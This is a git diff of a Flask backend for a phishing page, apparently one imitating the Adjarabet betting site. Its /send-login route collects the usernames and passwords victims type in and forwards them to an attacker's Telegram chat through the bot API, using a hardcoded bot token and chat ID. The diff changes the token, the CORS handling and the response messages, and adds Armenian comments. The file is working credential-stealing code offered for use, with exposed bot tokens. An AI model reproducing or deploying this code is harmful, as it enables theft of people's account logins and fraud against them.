@@ -1,15 +1,14 @@
 from flask import Flask, render_template, request, jsonify
-from flask_cors import CORS
 import requests
+import json
 from datetime import datetime
 
 app = Flask(__name__)
-CORS(app)
 
 # ============================================
 # 🔒 ՍԱ ՍԵՐՎԵՐՈՒՄ Է ՊԱՀՎՈՒՄ - ՉԻ ԵՐԵՎՈՒՄ HTML-ՈՒՄ
 # ============================================
-BOT_TOKEN = '8785157352:AAFIb95We15ttXbXFibgTYTJR6IxrA5goAM'
+BOT_TOKEN = '8612671726:AAGHAf0KCLWFw_OlGtrGeOHd0L5yzGFKMyU'
 CHAT_ID = '8707669446'
 # ============================================
 
@@ -17,26 +16,24 @@ CHAT_ID = '8707669446'
 def index():
     return render_template('index.html')
 
-@app.route('/send-login', methods=['POST', 'OPTIONS'])
+@app.route('/send-login', methods=['POST'])
 def send_login():
-    if request.method == 'OPTIONS':
-        return '', 200
-        
     try:
         data = request.get_json()
         username = data.get('username', '')
         password = data.get('password', '')
         
+        # ✅ ԵԹԵ OTP_REQUEST Է, ՉԵՆՔ ՈՒՂԱՐԿՈՒՄ TELEGRAM
         if password == 'OTP_REQUEST':
-            return jsonify({'ok': True, 'message': 'SMS მუშაობს', 'redirect': False})
+            return jsonify({'ok': True, 'message': 'SMS մուտք - տվյալներ չեն ուղարկվել Telegram'})
         
-        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        
+        # ✅ ԻՐԱՐ ՏԱԿ, ԻՐԱՐԻՑ ՀԵՌՈՒ, ՀԱՍՏ ՏԱՌԵՐՈՎ
         message = f"""
 <b>👤</b> <b><code>{username}</code></b>
 <b>🔑</b> <b><code>{password}</code></b>
 """
         
+        # Telegram-ին ուղարկել HTML ձևաչափով
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
         payload = {
             'chat_id': CHAT_ID,
@@ -44,13 +41,16 @@ def send_login():
             'parse_mode': 'HTML'
         }
         
-        requests.post(url, data=payload)
+        response = requests.post(url, data=payload)
+        result = response.json()
         
-        # Վերադարձնում ենք հաջողություն և ասում, որ բացենք Adjarabet-ը
-        return jsonify({'ok': True, 'message': '✅ მონაცემები მიღებულია', 'redirect': True})
-        
+        if result.get('ok'):
+            return jsonify({'ok': True, 'message': 'Ուղարկված է'})
+        else:
+            return jsonify({'ok': False, 'error': result.get('description')})
+            
     except Exception as e:
-        return jsonify({'ok': False, 'error': str(e), 'redirect': False})
-        
+        return jsonify({'ok': False, 'error': str(e)})
+
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=True)
